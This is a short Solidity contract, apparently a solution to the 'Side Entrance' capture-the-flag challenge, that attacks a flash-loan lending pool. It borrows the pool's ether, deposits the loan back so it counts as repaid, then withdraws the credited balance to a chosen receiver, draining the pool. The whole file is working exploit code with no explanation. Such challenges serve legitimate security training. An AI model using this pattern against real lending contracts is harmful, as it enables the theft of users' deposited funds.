// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
  SideEntranceLenderPool pool;

  constructor (address _pool) {
    pool = SideEntranceLenderPool(_pool);
  }

  receive() external payable {}

  function flashLoanAttack(uint256 amount) external {
    pool.flashLoan(amount);
  }

  function execute() external payable {
    pool.deposit{value: msg.value}();
  }

  function withdraw(address receiver) external {
    pool.withdraw();

    payable(receiver).transfer(address(this).balance);
  }
}